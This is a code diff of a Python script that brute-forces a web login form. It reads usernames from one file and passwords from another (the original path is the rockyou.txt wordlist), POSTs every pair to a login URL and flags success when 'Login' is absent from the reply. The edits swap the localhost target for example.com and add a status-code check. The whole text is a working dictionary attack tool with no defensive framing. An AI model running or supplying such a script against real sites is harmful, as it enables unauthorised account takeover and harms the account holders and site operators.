@@ -1,17 +1,18 @@
 import requests
+import urllib.request
 
 # Set the login URL
-login_url = 'http://localhost:8080/login.html?return=/index.html'
+login_url = 'https://www.example.com/login.html'
 
 # Open the username file in read mode
-with open('./users.txt', 'r') as username_file:
+with open('path/to/username/file.txt', 'r') as username_file:
   # Read the usernames from the file, one line at a time
   for username in username_file:
     # Remove the newline character from the end of the username
     username = username.strip()
 
     # Open the password file in read mode
-    with open('./rockyou.txt', 'r') as password_file:
+    with open('path/to/password/file.txt', 'r') as password_file:
       # Read the passwords from the file, one line at a time
       for password in password_file:
         # Remove the newline character from the end of the password
@@ -23,7 +24,10 @@ with open('./users.txt', 'r') as username_file:
         # Send an HTTP POST request to the login URL with the login payload
         response = requests.post(login_url, data=payload)
         
-        print(f"Redirected URL: {response.url}")
+        #return a status code
+        status_code = requests.head(response.url)
+
+        print(f"Redirected URL: {status_code.status_code}")
         print(f"Length of response: {len(response.text)} (Username: {username}, Password: {password})")
         # Check if the login was successful by searching for the absence of the keyword "Login" in the HTML
         if "Login" not in response.text:
